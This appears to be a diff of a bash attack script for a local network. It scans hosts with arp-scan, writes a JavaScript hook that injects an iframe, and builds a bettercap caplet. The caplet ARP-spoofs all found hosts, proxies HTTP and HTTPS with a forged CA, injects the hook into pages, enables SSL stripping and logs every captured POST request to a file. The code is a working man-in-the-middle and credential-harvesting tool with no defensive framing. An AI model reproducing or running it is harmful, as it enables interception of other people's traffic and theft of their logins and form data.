@@ -183,10 +183,9 @@ service apache2 restart
 # --- GENERATE HOOK.JS & CAPLET ---
 # ========================
 color_print CYAN "[*] Scanning network..."
-TARGETS=$(arp-scan --interface="$IFACE" --localnet --ignoredups --plain |
-          awk '{print $1}' |
-          grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' |
-          grep -v "$LAN" | sort -u | paste -sd ',' -)
+TARGETS=$(arp-scan --interface="$IFACE" --localnet --ignoredups 2>/dev/null | \
+    awk '/^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/ {print $1}' | \
+    grep -v "$LAN" | sort -u | paste -sd ',' -)
 
 cat > "$MITM_DIR/hook.js" <<EOF
 const iframe = document.createElement('iframe');
@@ -198,27 +197,27 @@ document.body.appendChild(iframe);
 EOF
 
 cat > "$MITM_DIR/fallback.cap" <<EOF
-# Targets for ARP spoofing
 set arp.spoof.targets $TARGETS
 set arp.spoof.internal true
-
-# Enable ARP spoofing
 arp.spoof on
 
-# Enable HTTP and HTTPS proxy with custom CA cert/key
-set http.proxy true
-set https.proxy true
 set https.proxy.certificate $CA_CERT_PEM
 set https.proxy.key $CA_KEY
 
-# Inject custom javascript into HTTP/HTTPS traffic
 set http.proxy.script $MITM_DIR/hook.js
 set https.proxy.script $MITM_DIR/hook.js
 
-# Enable downgrade attack (SSL stripping)
+http.proxy on
+https.proxy on
+
+set http.proxy.verbose true
+
+set events.stream.output /tmp/http-post.log
+set events.stream.filter "http.request and http.request.method == 'POST'"
+
 set https.proxy.sslstrip true
 
-# Optional: enable net probe for discovering hosts (if needed)
+events.stream on
 net.probe on
 EOF
 
